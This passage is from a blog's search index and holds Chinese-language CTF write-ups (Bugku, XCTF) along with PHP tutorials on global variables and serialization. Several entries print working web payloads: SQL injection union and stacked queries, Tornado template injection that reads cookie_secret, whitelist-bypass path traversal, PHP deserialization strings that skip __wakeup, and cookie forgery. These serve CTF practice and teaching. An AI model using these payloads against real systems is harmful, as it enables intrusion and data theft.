src="/2021/04/03/bugku-web20-cookie-qi-pian/blog/source_posts\Bugku：Web20-cookie欺骗\line=10.png" alt="line=10"></p><p>拼接以后：</p><pre><code>&lt;?phperror_reporting(0);$file=base64_decode(isset($_GET['filename'])?$_GET['filename']:"");$line=isset($_GET['line'])?intval($_GET['line']):0;if($file=='') header("location:index.php?line=&amp;filename=a2V5cy50eHQ=");$file_list = array('0' =&gt;'keys.txt','1' =&gt;'index.php',); if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin'){$file_list[2]='keys.php';}if(in_array($file, $file_list)){ $fa = file($file);echo $fa[$line];}?&gt;</code></pre><p>所以当cookie中</p><pre><code>margin=margin</code></pre><p>访问keys.txt</p><p>hacker伪造cookie</p><p>得到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web13-看看源代码</title>
      <link href="2021/03/30/bugku-web13-kan-kan-yuan-dai-ma/"/>
      <url>2021/03/30/bugku-web13-kan-kan-yuan-dai-ma/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/03/30/bugku-web13-kan-kan-yuan-dai-ma/blog/source_posts\Bugku：Web13-看看源代码\描述.png" alt="描述"></p><p>f12</p><p><img src="/2021/03/30/bugku-web13-kan-kan-yuan-dai-ma/blog/source_posts\Bugku：Web13-看看源代码\f12.png" alt="f12"></p><p>解码得</p><pre><code>function checkSubmit(){  var a = document.getElementById("password");  if("undefined"!=typeof a){    if("67d709b2b54aa2aa648cf6e87a7114f1"==a.value)return!0;    alert("Error");    a.focus();    return!1    }}document.getElementById("levelQuest").onsubmit = checkSubmit;</code></pre><p>发送67d709b2b54aa2aa648cf6e87a7114f1得到flag</p><pre><code>flag{6917495a0e17df3f54d72aaf72c64645}</code></pre><p><img src="/2021/03/30/bugku-web13-kan-kan-yuan-dai-ma/blog/source_posts\Bugku：Web13-看看源代码\flag.png" alt="flag"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Bugku:Web9</title>
      <link href="2021/03/30/bugku-web9/"/>
      <url>2021/03/30/bugku-web9/</url>
      
        <content type="html"><![CDATA[<pre><code>flag In the variable ! &lt;?php  error_reporting(0);include "flag1.php";highlight_file(__file__);if(isset($_GET['args'])){    $args = $_GET['args'];    if(!preg_match("/^\w+$/",$args)){        die("args error!");    }    eval("var_dump($$args);");}?&gt; </code></pre><p>flag in the variable 就说了flag在变量中<br>error_reporting(0); 关闭报错提示<br>include “flag1.php”; 此时引入flag1的代码<br>highlight_file(<em>file</em>); 高亮显示<br>if(isset($_GET[‘args’])) 条件判断 get方法传递的args参数是否存在<br>若存在然后赋值<br>preg_match() 函数 — 执行匹配正则表达式<br>/^开始, \w表示任意一个单词字符，即[a-zA-Z0-9_] ,+将前面的字符匹配一次或多次，$/结尾<br>die(“args error!”); 输出 args error!<br>eval(“var_dump($$args);”); 将字符串作为php代码执行结尾加分号<br>var_dump()函数 显示关于一个或多个表达式的结构信息，包括表达式的类型与<br>值。数组将递归展开值，通过缩进显示其结构。</p><p>$$args 可以理解为$($args)</p><p>eval()函数存在命令执行漏洞.</p><p>flag In the variable 就说了flag在变量中，所以我们想办法用命令输出变量即可，我们想到构造 php中超全局变量 $GLOBALS<br>PHP 在名为 $GLOBALS[index]* 的数组中存储了所有全局变量。变量的名字就是数组的键。*<br>即 .php?args=GLOBALS</p><p>eval(“var_dump($$args);”);    </p><pre><code>1</code></pre><p>首先将 var_dump($$args); 当成代码执行 var_dump($GLOBALS);</p><p>var_dump()函数将$GLOBALS数组中存放的所有变量以数组的方式输出 得到flag。<br><img src="/2021/03/30/bugku-web9/blog/source_posts\Bugku：Web9\1.png" alt="1"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Bugku </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP:全局变量global和$GLOBALS详解</title>
      <link href="2021/03/29/php-quan-ju-bian-liang-global-he-globals-xiang-jie/"/>
      <url>2021/03/29/php-quan-ju-bian-liang-global-he-globals-xiang-jie/</url>
      
        <content type="html"><![CDATA[<p>变量的范围即它定义的上下文背景（也就是它的生效范围）。大部分的 PHP 变量只有一个单独的范围。这个单独的范围跨度同样包含了 include 和 require 引入的文件。</p><pre><code>$a = 1;include 'b.php';</code></pre><p>这里变量 $a 将会在包含文件 b.inc 中生效。但是，在用户自定义函数中，一个局部函数范围将被引入。任何用于函数内部的变量按缺省情况将被限制在局部函数范围内。例如</p><pre><code>$a = 1; /* global scope */function Test(){    echo $a; /* reference to local scope variable */}Test();</code></pre><p>这个脚本不会有任何输出，因为 echo 语句引用了一个局部版本的变量 $a，而且在这个范围内，它并没有被赋值。<strong>PHP 中全局变量在函数中使用时必须声明为 global。</strong><br>1.global</p><p>　　在函数体内定义的global变量,定义后可以全局使用使用,在函数体外定义的global变量不能在函数体内使用,具体看下面示例。</p><p>（1）在函数体内定义global变量，函数体内可以使用。</p><pre><code>&lt;?php$a = 1;$b = 2;function Sum(){    global $a, $b; //在里面声明为全局变量    $b = $a + $b;}Sum();echo $b;//结果 3//以上脚本的输出将是“3”。在函数中声明了全局变量 $a 和 $b 之后，对任一变量的所有引用都会指向其全局版本。//对于一个函数能够声明的全局变量的最大个数，PHP 没有限制。</code></pre><p>（2）在函数体外定义global变量，函数体内不可以使用。</p><pre><code>global $a;$a = 3;function test() {    var_dump($a);    var_dump($GLOBALS);die;}test();//结果Notice: Undefined variable: a in /users/kano/home/ts/123.php on line 5Call Stack /users/kano/home/ts/123.php:5:null/users/kano/home/ts/123.php:6:int 3// 可以看到其实全局变量是没问题的，但是在函数内定义的$a并非全局变量里的$a.如果要在全局变量内访问到$a的值，可以通过$GLOBALS['a']来解决。</code></pre><p>2.$GLOBALS<br>在 $GLOBALS 数组中，每一个变量为一个元素，键名对应变量名，值对应变量的内容。$GLOBALS 之所以在全局范围内存在，是因为 $GLOBALS 是一个超全局变量。注意$GLOBALS 的写法，比如变量$a1,写法为$GLOBALS[‘a1’]。</p><p>示例：先使用global定义</p><pre><code>$a = 1;$b = 2;function Sum(){    global $a, $b; //在里面声明为全局变量    $b = $a + $b;}Sum();echo $b;</code></pre><p>使用$GLOBALS定义全局变量</p><pre><code>$a = 1;$b = 2;function Sum(){     $GLOBALS["b"] = $GLOBALS["a"] + $GLOBALS["b"];//定义变量时每个都要定义}Sum(); echo $b; //输出结果为2</code></pre><p>以上两种写法等价。</p><pre><code>function test_global() {     global $var1, $var2;     //声明两个全局变量$GLOBALS['var1']和$GLOBALS['var2'],    //并且创建全局变量的引用    //$var1 $GLOBALS['var1'] 指向同一个内存地址A    //$var2 $GLOBALS['var2'] 指向同一个内存地址B    $var2 =&amp; $var1;     //引用关系改变 $var2指向A，所以$var2=内存地址A的内容    //而$GLOBALS['var2']仍指向B} function test_globals() {     $GLOBALS['var3'] =&amp; $GLOBALS['var1'];     //全局变量var3和var1指向共同的内容，$var3=$var1} $var1 = 5; $var2 = $var3 = 0; test_global(); print $var2; //输出结果为0test_globals(); print $var3; //输结果为05</code></pre><p>global 引用 当用 global $var 声明一个变量时实际上建立了一个到全局变量的引用。也就是说和这样做是相同的：</p><pre><code> $var =&amp; $GLOBALS["var"]; </code></pre><p><img src="/2021/03/29/php-quan-ju-bian-liang-global-he-globals-xiang-jie/blog/source_posts\PHP：全局变量global和$GLOBALS详解\20181203180612917.jpg" alt="20181203180612917"></p><p>这意味着，例如，unset $var 不会 unset 全局变量。</p><p>$this 在一个对象的方法中，$this 永远是调用它的对象的引用。</p><p>//下面再来个小插曲 php中对于地址的指向（类似指针）功能不是由用户自己来实现的，是由Zend核心实现的，php中引用采用的是“写时拷贝”的原理，就是除非发生写操作，指向同一个地址的变量或者对象是不会被拷贝的。</p><p>通俗的讲 1:如果有下面的代码 </p><pre><code> $a="ABC"; $b=$a; </code></pre><p>其实此时　$a与$b都是指向同一内存地址　而并不是$a与$b占用不同的内存</p><p>２:如果在上面的代码基础上再加上如下代码 </p><pre><code> $a="EFG";</code></pre><p>由于$a与$b所指向的内存的数据要重新写一次了，此时Zend核心会自动判断自动为$b生产一个$a的数据拷贝，重新申请一块内存进行存储</p><p><img src="/2021/03/29/php-quan-ju-bian-liang-global-he-globals-xiang-jie/blog/source_posts\PHP：全局变量global和$GLOBALS详解\20181203180756852.jpg" alt="20181203180756852"><br>原文链接：<a href="https://blog.csdn.net/Kano_W/article/details/84776777">https://blog.csdn.net/Kano_W/article/details/84776777</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF:Web-easytornado</title>
      <link href="2021/03/28/xctf-web-easytornado/"/>
      <url>2021/03/28/xctf-web-easytornado/</url>
      
        <content type="html"><![CDATA[<p>访问网站：</p><p><img src="/2021/03/28/xctf-web-easytornado/blog/source_posts\XCTF：Web-easytornado\111.200.241.24448236.png" alt="111.200.241.24448236"></p><h4 id="flag-txt"><a href="#flag-txt" class="headerlink" title="flag.txt"></a>flag.txt</h4><p><img src="/2021/03/28/xctf-web-easytornado/blog/source_posts\XCTF：Web-easytornado\flag.txt.png" alt="flag.txt"></p><h4 id="welcome-txt"><a href="#welcome-txt" class="headerlink" title="welcome.txt"></a>welcome.txt</h4><p><img src="/2021/03/28/xctf-web-easytornado/blog/source_posts\XCTF：Web-easytornado\welcome.txt.png" alt="welcome.txt"></p><p>render是python中的一个渲染函数，渲染变量到模板中，即可以通过传递不同的参数形成不同的页面。</p><h4 id="hints-txt"><a href="#hints-txt" class="headerlink" title="hints.txt"></a>hints.txt</h4><p><img src="/2021/03/28/xctf-web-easytornado/blog/source_posts\XCTF：Web-easytornado\hints.txt.png" alt="hints.txt"></p><p>filehash=md5(cookie_secret+md5(filename)) 现在filename=/fllllllllllllag，只需要知道cookie_secret的既能访问flag。</p><p>测试后发现还有一个error界面，格式为/error?msg=Error，怀疑存在服务端模板注入攻击 （SSTI）<br> 尝试/error?msg= 在Tornado的前端页面模板中，datetime是指向python中datetime这个模块，Tornado提供了一些对象别名来快速访问对象，可以参考Tornado官方文档</p><p><img src="/2021/03/28/xctf-web-easytornado/blog/source_posts\XCTF：Web-easytornado\errormsg=.png" alt="errormsg="></p><p>通过查阅文档发现cookie_secret在Application对象settings属性中，还发现self.application.settings有一个别名</p><p>handler指向的处理当前这个页面的RequestHandler对象，  RequestHandler.settings指向self.application.settings，  因此handler.settings指向RequestHandler.application.settings。<br> 构造payload获取cookie_secret</p><pre><code>error?msg={{handler.settings}}</code></pre><p><img src="/2021/03/28/xctf-web-easytornado/blog/source_posts\XCTF：Web-easytornado\cookie.png" alt="cookie"></p><p>利用这个脚本计算出filehash的值</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlib<span class="token keyword">def</span> <span class="token function">md5</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>    md5 <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>    md5<span class="token punctuation">.</span>update<span class="token punctuation">(</span>s<span class="token punctuation">)</span>    <span class="token keyword">return</span> md5<span class="token punctuation">.</span>hexdigests<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">filehash</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    filename <span class="token operator">=</span> <span class="token string">'/fllllllllllllag'</span>    cookie_secret <span class="token operator">=</span> <span class="token string">'这里填hash'</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>md5<span class="token punctuation">(</span>cookie_secret<span class="token operator">+</span>md5<span class="token punctuation">(</span>filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    filehash<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>cookie_secret</p><pre><code>2e3ee5f8-f039-4130-b0c3-0a1d6ce7676c</code></pre><pre><code>728ec3dc0db938043d73b1028a911254</code></pre><pre><code>2e3ee5f8f0394130b0c30a1d6ce7676c</code></pre><pre><code>588a1b37df48f7f13e7febb5f4419049</code></pre><p>/fllllllllllllag</p><p>md5加密一次：</p><pre><code>3bf9f6cf685a6dd8defadabfb41a03a1</code></pre><p>拼接md5再加密一次</p><pre><code>file?filename=/fllllllllllllag&amp;filehash=cd12e4114120fd5b2fc0cd92f8074699</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF:Web-NewsCenter</title>
      <link href="2021/03/27/xctf-web-newscenter/"/>
      <url>2021/03/27/xctf-web-newscenter/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/03/27/xctf-web-newscenter/blog/source_posts\XCTF：Web-NewsCenter\be3fd981eca3efc0534781b63e0e910.png" alt="be3fd981eca3efc0534781b63e0e910"></p><p>1’ and 1=1 #判断有无sql注入发现有</p><p>查看列数1’ order by 3 #</p><p>联合查询 1’ union select 1,2,3 #</p><pre><code>1’ union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #</code></pre><pre><code>1’ union select 1,group_concat(column_name),3 from  information_schema.columns where table_schema=database() and  table_name=‘secret_table’ #</code></pre><pre><code>’ union select 1,2,(select group_concat(id,0x3a,fl4g) from users) #</code></pre><pre><code>QCTF{sq1_inJec7ion_ezzz}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF:Web-warmup</title>
      <link href="2021/03/24/xctf-web-warmup/"/>
      <url>2021/03/24/xctf-web-warmup/</url>
      
        <content type="html"><![CDATA[<p><img src="/2021/03/24/xctf-web-warmup/blog/source_posts\XCTF：Web-warmup\滑稽.png" alt="滑稽"></p><p>访问：</p><pre><code>http://111.200.241.244:54849/source.php</code></pre><pre><code> &lt;?php    highlight_file(__FILE__);    class emmm    {        public static function checkFile(&amp;$page)        {            $whitelist = ["source"=&gt;"source.php","hint"=&gt;"hint.php"];            if (! isset($page) || !is_string($page)) {                echo "you can't see it";                return false;            }            if (in_array($page, $whitelist)) {                return true;            }            $_page = mb_substr(                $page,                0,                mb_strpos($page . '?', '?')            );            if (in_array($_page, $whitelist)) {                return true;            }            $_page = urldecode($page);            $_page = mb_substr(                $_page,                0,                mb_strpos($_page . '?', '?')            );            if (in_array($_page, $whitelist)) {                return true;            }            echo "you can't see it";            return false;        }    }    if (! empty($_REQUEST['file'])        &amp;&amp; is_string($_REQUEST['file'])        &amp;&amp; emmm::checkFile($_REQUEST['file'])    ) {        include $_REQUEST['file'];        exit;    } else {        echo "&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;";    }  ?&gt;</code></pre><p>访问：</p><pre><code>hint.php</code></pre><p><img src="/2021/03/24/xctf-web-warmup/blog/source_posts\XCTF：Web-warmup\hint.php.png" alt="hint.php"></p><p>发现满足三个条件，会包含并运行指定文件<code>file</code>，此处的<code>file</code>可以由我们构造，为切入点：</p><ol><li>检查<code>file</code>变量是否为空</li><li>检查<code>file</code>变量是否为字符串</li><li>通过自定义的<code>checkFile</code>函数来检查</li></ol><p>由于我们要构造payload，前两点直接满足，直接查看<code>checkFile</code>函数代码：</p><p>发现包含四个if语句：</p><pre><code>第一个 if 语句对变量进行检验，要求$page为字符串，否则返回 false第二个 if 语句判断$page是否存在于$whitelist数组中，存在则返回 true第三个 if 语句，截取传进参数中首次出现?之前的部分，判断该部分是否存在于$whitelist数组中，，存在则返回 true第四个 if 语句，先对构造的 payload 进行 url 解码，再截取传进参数中首次出现?之前的部分，并判断该部分是否存在于$whitelist中，存在则返回 true</code></pre><p>以上四个满足一个即可返回 true，若均未满足，则返回 false<br>我们利用第三个 if 语句构造参数：</p><pre><code>?file=source.php?/../../../../ffffllllaaaagggg</code></pre><p> 第一个<code>?</code>表示传参，第二个<code>?</code>用来满足截取</p><p> 第一个<code>?</code>表示传参，第二个<code>?</code>用来满足截取</p><pre><code>flag{25e7bce6005c4e0c983fb97297ac6e5a} </code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF:Web2</title>
      <link href="2021/03/24/xctf-web2/"/>
      <url>2021/03/24/xctf-web2/</url>
      
        <content type="html"><![CDATA[<pre><code>&lt;?php$miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";function encode($str){    $_o=strrev($str);    // echo $_o;    for($_0=0;$_0&lt;strlen($_o);$_0++){        $_c=substr($_o,$_0,1);        $__=ord($_c)+1;        $_c=chr($__);        $_=$_.$_c;       }     return str_rot13(strrev(base64_encode($_)));}highlight_file(__FILE__);/*   逆向加密算法，解密$miwen就是flag*/?&gt; </code></pre><p>加密流程并不复杂，</p><h5 id="即-反转字符串-gt-每个字符的ASCII加1-gt-base64编码-gt-反转字符串-gt-rot13编码"><a href="#即-反转字符串-gt-每个字符的ASCII加1-gt-base64编码-gt-反转字符串-gt-rot13编码" class="headerlink" title="即:反转字符串 => 每个字符的ASCII加1 => base64编码 => 反转字符串 => rot13编码"></a>即:反转字符串 =&gt; 每个字符的ASCII加1 =&gt; base64编码 =&gt; 反转字符串 =&gt; rot13编码</h5><p>所以解密流程反着来就行了，</p><h5 id="即-rot13解码-gt-反转字符串-gt-base64解码-gt-每个字符的ASCII加1-gt-反转字符串"><a href="#即-rot13解码-gt-反转字符串-gt-base64解码-gt-每个字符的ASCII加1-gt-反转字符串" class="headerlink" title="即:rot13解码 => 反转字符串 => base64解码 => 每个字符的ASCII加1 => 反转字符串"></a>即:rot13解码 =&gt; 反转字符串 =&gt; base64解码 =&gt; 每个字符的ASCII加1 =&gt; 反转字符串</h5><p>（对rot13编码过的字符串在进行一次rot13编码即为解码）</p><pre><code>&lt;?php//rot13解密=&gt;字符串反转=&gt;base64解密=&gt;每个字符的ASCII减1=&gt;反转字符串$miwen="a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws";function decode($str){    $_o = base64_decode(strrev(str_rot13($str)));    for($_0=0;$_0&lt;strlen($_o);$_0++){  //2.每个字符ascii+1        $_c=substr($_o,$_0,1);         $__=ord($_c)-1;         $_c=chr($__);         $_=$_.$_c;        }      return strrev($_);}echo decode($miwen);?&gt;</code></pre><pre><code>flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977} </code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF:Web-unserialize</title>
      <link href="2021/03/18/xctf-web-unserialize/"/>
      <url>2021/03/18/xctf-web-unserialize/</url>
      
        <content type="html"><![CDATA[<pre><code>&lt;?php class Demo {     private $file = 'index.php';    public function __construct($file) {         $this-&gt;file = $file;     }    function __destruct() {         echo @highlight_file($this-&gt;file, true);     }    function __wakeup() {         if ($this-&gt;file != 'index.php') {             //the secret is in the fl4g.php            $this-&gt;file = 'index.php';         }     } }if (isset($_GET['var'])) {     $var = base64_decode($_GET['var']);     if (preg_match('/[oc]:\d+:/i', $var)) {         die('stop hacking!');     } else {        @unserialize($var);     } } else {     highlight_file("index.php"); } ?&gt;</code></pre><p>主要就是绕过 一： preg_match()     O:+4:”Demo”:1:{s:10:”Demofile”;s:8:”fl4g.php”;}</p><p>​                        二： __wakeup()        O:+4:”Demo”:2:{s:10:”Demofile”;s:8:”fl4g.php”;}</p><pre><code>?var=TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF:Web-unserialize3</title>
      <link href="2021/03/18/xctf-web-unserialize3/"/>
      <url>2021/03/18/xctf-web-unserialize3/</url>
      
        <content type="html"><![CDATA[<pre><code>class xctf{public $flag = '111';public function __wakeup(){exit('bad requests');}?code=</code></pre><p><strong>当 序列化的字符串中的属性值个数 大于 属性个数 就会导致反序列化异常 从而跳过 __wakeup()</strong></p><p>构造序列化字符串：</p><pre><code>&lt;?phpclass xctf{public $flag = "111";} $s = new xctf();echo(serialize($s));?&gt;</code></pre><p>echo：</p><pre><code>O:4:"xctf":1:{s:4:"flag";s:3:"111";}</code></pre><p>改成</p><pre><code>O:4:"xctf":2:{s:4:"flag";s:3:"111";}</code></pre><p>payload：</p><pre><code>?code=O:4:"xctf":2:{s:4:"flag";s:3:"111";}</code></pre><p>得到：</p><pre><code>cyberpeace{f407c0868203e42205f96349e56c9bf5}</code></pre>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP:序列化与反序列化</title>
      <link href="2021/03/18/php-xu-lie-hua-yu-fan-xu-lie-hua/"/>
      <url>2021/03/18/php-xu-lie-hua-yu-fan-xu-lie-hua/</url>
      
        <content type="html"><![CDATA[<h2 id="PHP序列化：serialize"><a href="#PHP序列化：serialize" class="headerlink" title="PHP序列化：serialize"></a>PHP序列化：serialize</h2><p>序列化是将变量或对象转换成字符串的过程。<br>举例：</p><pre><code>&lt;?phpclass man{ public $name; public $age; public $height; function __construct($name,$age,$height){        //_construct：创建对象时初始化  $this-&gt;name = $name;  $this-&gt;age = $age;  $this-&gt;height = $height; }}$man=new man("Bob",5,20);var_dump(serialize($man));?&gt;</code></pre><p>输出：</p><pre><code>string(67) "O:3:"man":3:{s:4:"name";s:3:"Bob";s:3:"age";i:5;s:6:"height";i:20;}"</code></pre><h3 id="解释一下输出结果："><a href="#解释一下输出结果：" class="headerlink" title="解释一下输出结果："></a>解释一下输出结果：</h3><h5 id="O-代表obeject-A-代表数组"><a href="#O-代表obeject-A-代表数组" class="headerlink" title="O:代表obeject/A:代表数组"></a>O:代表obeject/A:代表数组</h5><h5 id="3-代表对象名占三个字符"><a href="#3-代表对象名占三个字符" class="headerlink" title="3:代表对象名占三个字符"></a>3:代表对象名占三个字符</h5><h5 id="第二个3-代表对象里有三个变量"><a href="#第二个3-代表对象里有三个变量" class="headerlink" title="第二个3:代表对象里有三个变量"></a>第二个3:代表对象里有三个变量</h5><h5 id="S-数据类型-s-string-i-int"><a href="#S-数据类型-s-string-i-int" class="headerlink" title="S:数据类型 s:string/i:int"></a>S:数据类型 s:string/i:int</h5><h5 id="4-代表变量名的字符长度"><a href="#4-代表变量名的字符长度" class="headerlink" title="4:代表变量名的字符长度"></a>4:代表变量名的字符长度</h5><pre><code>Object(O)： O:&lt;class_name_length&gt;:"&lt;class_name&gt;":&lt;number_of_properties&gt;:{&lt;properties&gt;}Boolean（b）: b:value;(0或1)double（d）integer（i）: i:value;array（a）： a:&lt;length&gt;:{key,keyvalue}string（s）: s:&lt;length&gt;:value;null（N）</code></pre><h2 id="PHP反序列化：unserialize"><a href="#PHP反序列化：unserialize" class="headerlink" title="PHP反序列化：unserialize"></a>PHP反序列化：unserialize</h2><p>反序列化是将字符串转换成变量或对象的过程。<br>举例：</p><pre><code>&lt;?phpclass man{ public $name; public $age; public $height; function __construct($name,$age,$height){  $this-&gt;name = $name;  $this-&gt;age = $age;  $this-&gt;height = $height; }}$man= 'O:3:"man":3:{s:4:"name";s:3:"Bob";s:3:"age";i:5;s:6:"height";i:20;}';var_dump(unserialize($man));?&gt;</code></pre><p>输出：</p><pre><code>object(man)#1 (3) {  ["name"]=&gt;  string(3) "Bob"  ["age"]=&gt;  int(5)  ["height"]=&gt;  int(20)}</code></pre><h2 id="反序列化漏洞："><a href="#反序列化漏洞：" class="headerlink" title="反序列化漏洞："></a>反序列化漏洞：</h2><h4 id="两个条件："><a href="#两个条件：" class="headerlink" title="两个条件："></a><strong>两个条件：</strong></h4><ol><li><p>unserialize()函数的参数可控</p></li><li><p>php中有可以利用的类并且类中有魔幻函数</p><p>魔幻函数一般是以__开头，通常会因为某些条件而触发不用我们手动调用：</p></li></ol><h4 id="魔幻函数："><a href="#魔幻函数：" class="headerlink" title="魔幻函数："></a><strong>魔幻函数：</strong></h4><pre><code>_construct()：创建对象时初始化/当一个对象创建时被调用_destruction()：结束时销毁对象/当一个对象销毁时被调用_toString()：对象被当作字符串时使用/当一个对象被当作一个字符串使用_sleep()：序列化对象之前调用/在对象在被序列化之前运行_wakeup()：反序列化之前调用/将在序列化之后立即被调用_call()：调用对象不存在时使用_get()：调用私有属性时使用</code></pre><h3 id="例一："><a href="#例一：" class="headerlink" title="例一："></a>例一：</h3><pre><code>&lt;?phpclass A{    var $test = "demo";    function __destruct(){            echo $this-&gt;test;    }}$a = $_GET['test'];$a_unser = unserialize($a);?&gt;</code></pre><p>这里我们只要构造payload：</p><p><a href="http://127.0.0.1/test.php?test=O:1:">http://127.0.0.1/test.php?test=O:1:”A”:1:{s:4:”test”;s:5:”hello”;}</a></p><p>就能控制echo出的变量，比如你能拿这个来进行反射型xss。。。</p><h3 id="例二："><a href="#例二：" class="headerlink" title="例二："></a>例二：</h3><p>index.php</p><pre><code>&lt;?phpclass SoFun{  public $file='index.php';  function __destruct(){    if(!empty($this-&gt;file)){      if(strchr($this-&gt; file,"\\")===false &amp;&amp;  strchr($this-&gt;file, '/')===false){        echo "&lt;br&gt;";        show_source(dirname (__FILE__).'/'.$this -&gt;file);}      else        die('Wrong filename.');      }    }  function __wakeup(){     $this-&gt; file='index.php';     }    public function __toString(){return '' ;}}  if (!isset($_GET['file'])){    show_source('index.php');  }   else  {     $file = $_GET['file'];     echo unserialize($file);   } ?&gt;  &lt;!--key in flag.php--&gt;</code></pre><p>flag.php</p><pre><code>&lt;?phpecho "key{you got it!!}"?&gt;</code></pre><p>代码审计：</p><p>1.代码最后提示key在flag.php里，因此我们要想办法读里面的内容。<br>2.在__destruct()魔术方法中，show_source(dirname (<strong>FILE</strong>).’/‘.$this -&gt;file)这里是解题的关键，在反序列化之后会自动调用__destruct方法，可以利用这个将flag.php的内容读出来。<br>3.在__wakeup()魔术方法中，在反序列化后会自动调用__wakeup方法并将file的值置为index.php。<br>4.我们要想读出flag.php里的内容需要调用__destruct方法而绕过__wakeup方法。</p><p>这里要用到CVE-2016-7124漏洞：当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</p><h5 id="构造序列化对象：O-5-”SoFun”-1-s-4-”file”-s-8-”flag-php”"><a href="#构造序列化对象：O-5-”SoFun”-1-s-4-”file”-s-8-”flag-php”" class="headerlink" title="构造序列化对象：O:5:”SoFun”:1:{s:4:”file”;s:8:”flag.php”;}"></a>构造序列化对象：O:5:”SoFun”:1:{s:4:”file”;s:8:”flag.php”;}</h5><h5 id="构造绕过-wakeup：O-5-”SoFun”-2-s-4-”file”-s-8-”flag-php”"><a href="#构造绕过-wakeup：O-5-”SoFun”-2-s-4-”file”-s-8-”flag-php”" class="headerlink" title="构造绕过__wakeup：O:5:”SoFun”:2:{s:4:”file”;s:8:”flag.php”;}"></a>构造绕过__wakeup：O:5:”SoFun”:2:{s:4:”file”;s:8:”flag.php”;}</h5><h3 id="例三："><a href="#例三：" class="headerlink" title="例三："></a>例三：</h3><pre><code>&lt;?php     require_once('shield.php');    $x = new Shield();    isset($_GET['class']) &amp;&amp; $g = $_GET['class'];    if (!empty($g)) {        $x = unserialize($g);    }    echo $x-&gt;readfile();?&gt;</code></pre><p>可以看见 先是包含了shield.php 然后从中new了个新的实例出来 最后接收用户的反序列化 输出readfile()方法</p><p>跟进：</p><pre><code>&lt;?php    //flag is in pctf.php    class Shield {        public $file;        function __construct($filename = '') {            $this -&gt; file = $filename;        }        function readfile() {            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,'..')===FALSE              &amp;&amp; stripos($this-&gt;file,'/')===FALSE &amp;&amp; stripos($this-&gt;file,'\\')==FALSE) {                return @file_get_contents($this-&gt;file);            }        }    }?&gt;</code></pre><p>这里我们可以看见只要操控$file这个参数为pctf.php就可以了，这里construct函数在实例被创建的时候(也就是new Shield()的时候)执行，所以不会影响我们对$file的操作</p><p>直接构造序列化对象传过去 O:6:”Shield”:1:{s:4:”file”;s:8:”pctf.php”;} 就行了</p><p>参考：</p><p><a href="https://www.freebuf.com/articles/web/167721.html">https://www.freebuf.com/articles/web/167721.html</a></p><p><a href="https://blog.csdn.net/weixin_44677409/article/details/93884388">https://blog.csdn.net/weixin_44677409/article/details/93884388</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>XCTF:Web-supersqli</title>
      <link href="2021/03/17/xctf-web-supersqli/"/>
      <url>2021/03/17/xctf-web-supersqli/</url>
      
        <content type="html"><![CDATA[<p>点击提交查询发现可能存在SQL注入漏洞</p><p>输入1’发现不回显，然后1’ #显示正常，应该是存在sql注入了</p><p>order by 2的时候是正常回显了，order by 3就出错了</p><p>![order by 3报错](D:\blog\source_posts\XCTF：Web-supersqli\order by 3报错.png)</p><p>判断只有2个字段，这时候用?inject=1 union select 1,2#进行联合查询，发现关键字被正则过滤</p><p><img src="/2021/03/17/xctf-web-supersqli/blog/source_posts\XCTF：Web-supersqli\被过滤.png" alt="被过滤"></p><p>采用堆叠注入：</p><pre><code>-1';show tables --+</code></pre><p>![-1’;show tables –+](D:\blog\source_posts\XCTF：Web-supersqli-1’;show tables –+.png)</p><pre><code>-1';show columns from `1919810931114514` --+</code></pre><p>![-1’;show columns from <code>1919810931114514</code> –+](D:\blog\source_posts\XCTF：Web-supersqli-1’;show columns from <code>1919810931114514</code> –+.png)</p><pre><code>-1';show columns from words --+</code></pre><p>![-1’;show columns from words –+](D:\blog\source_posts\XCTF：Web-supersqli-1’;show columns from words –+.png)</p><pre><code>-1';set @sql = CONCAT('se','lect * from `1919810931114514`;');prepare stmt from @sql;EXECUTE stmt;#</code></pre><p><img src="/2021/03/17/xctf-web-supersqli/blog/source_posts\XCTF：Web-supersqli\1.png" 